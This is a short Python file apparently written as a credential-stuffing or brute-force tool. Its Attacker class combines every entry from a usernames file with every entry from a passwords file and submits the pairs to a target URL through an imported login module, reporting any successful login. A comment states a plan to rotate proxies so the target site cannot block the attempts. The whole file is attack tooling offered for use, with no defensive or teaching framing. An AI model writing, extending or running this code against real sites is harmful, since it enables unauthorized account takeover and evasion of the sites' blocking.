import itertools
import login


# In this part of the attack I need to implement a pool of proxies to constantly replace the
# exit from which I am trying to connect to the site in order not to be blocked


class Attacker:
    def __init__(self, url):
        self.url = url

    @staticmethod
    def create_user_and_pass_combinations():
        with open('usernames.txt', 'r') as usernames_file:
            usernames = usernames_file.read()
            usernames_list = usernames.splitlines()
        with open('passwords.txt', 'r') as passwords_file:
            passwords = passwords_file.read()
            passwords_list = passwords.splitlines()

        combinations_list = list(itertools.product(usernames_list, passwords_list))
        return combinations_list

    def attack(self):
        combinations_list = Attacker.create_user_and_pass_combinations()
        result = login.test_all_users(combinations_list, self.url)
        if result:
            print(f'Success login to url {self.url}')
